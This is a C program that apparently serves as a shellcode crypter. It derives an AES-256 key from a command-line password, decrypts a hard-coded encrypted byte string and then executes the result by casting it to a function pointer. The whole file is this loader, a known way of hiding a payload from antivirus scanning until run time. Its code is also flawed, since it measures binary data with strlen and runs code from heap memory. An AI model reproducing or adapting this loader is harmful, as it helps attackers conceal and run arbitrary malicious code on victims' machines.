#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

// generate keys
int aes_init(unsigned char *key_data, int key_data_len, unsigned char *salt, EVP_CIPHER_CTX *d_ctx)
{
        int i, nrounds = 5;
        unsigned char key[32], iv[32];

        /*
         * Gen key & IV for AES 256 CBC mode. A SHA1 digest is used to hash the supplied key material.
         * nrounds is the number of times the we hash the material. More rounds are more secure but
         * slower.
         */

        i = EVP_BytesToKey(EVP_aes_256_cbc(), EVP_sha1(), salt, key_data, key_data_len, nrounds, key, iv);
        if (i != 32) {
                printf("Key size is %d bits - should be 256 bits\n", i);
                return -1;
        }
        EVP_CIPHER_CTX_init(d_ctx);
        EVP_DecryptInit_ex(d_ctx, EVP_aes_256_cbc(), NULL, key, iv);

        return 0;
}

// let's decrypt
unsigned char *aes_decrypt(EVP_CIPHER_CTX *e, unsigned char *ciphertext, int *len)
{
	/* because we have padding ON, we must allocate an extra cipher block size of memory */
	int p_len = *len, f_len = 0;
	unsigned char *plaintext = malloc(p_len + AES_BLOCK_SIZE);
  
	EVP_DecryptInit_ex(e, NULL, NULL, NULL, NULL);
	EVP_DecryptUpdate(e, plaintext, &p_len, ciphertext, *len);
	EVP_DecryptFinal_ex(e, plaintext+p_len, &f_len);

	*len = p_len + f_len;
	return plaintext;
}


int main(int argc, char **argv)
{
	// our context to decrypt
        EVP_CIPHER_CTX ctx_de;
        
	// let's use some salt
        unsigned int salt[] = {12345, 54321, 00000, 99999};
        
	// the password
        unsigned char *key_data = (unsigned char *)argv[1];
        int key_data_len = strlen(argv[1]);
        
	// init aes
        if (aes_init(key_data, key_data_len, (unsigned char *)&salt, &ctx_de)) {
                printf("Couldn't initialize AES cipher\n");
                return -1;
        }
	
	//our encrypted code
	unsigned char encrypted_code[] = "\xd2\x37\x6f\x98\x7c\x3b\xa6\x5a\x54\xe6\xac\xc6\x7b\xbe\x37\xcb\xca\x2a\x4c\x16\x4f\xb5\x18\x5a\x6a\xd2\x20\xaf\xe2\x36\x9f\x33";
	unsigned int len = strlen(encrypted_code);
	
	//the decrypted code
	unsigned char *code;
	code = (char *)aes_decrypt(&ctx_de, encrypted_code, &len);
	
        int i;
        for(i = 0; i < strlen(encrypted_code); i++)
                printf("\\x%02x", code[i]);
        printf("\nLength:%zu\n", strlen(code));

	//let's run it
	int (*ret)() = (int(*)())code;
	ret();
	
	return 0;
}
